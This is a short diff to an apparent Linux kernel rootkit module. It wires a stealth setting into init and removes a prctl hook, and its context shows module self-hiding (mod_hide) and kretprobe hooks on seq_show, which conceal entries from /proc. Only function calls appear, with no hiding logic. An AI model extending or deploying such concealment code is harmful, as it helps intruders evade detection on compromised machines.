@@ -1152,6 +1152,8 @@ static int __init mod_init(void)
 {
     int i, ret;
     
+    g_config.stealth_mode = stealth;
+    
     // Initialize kallsyms
     ret = init_kallsyms();
     if (ret < 0)
@@ -1205,9 +1207,6 @@ static int __init mod_init(void)
     }
     write_unlock(&g_data.lock);
     
-    // Setup prctl hook
-    setup_prctl_hook();
-    
     // Hide module
     if (stealth)
         mod_hide();
@@ -1222,9 +1221,6 @@ static void __exit mod_exit(void)
     int i;
     
     g_data.active = false;
-    
-    // Cleanup prctl hook
-    cleanup_prctl_hook();
     
     // Cleanup seq_show kretprobes
     remove_seq_hooks();
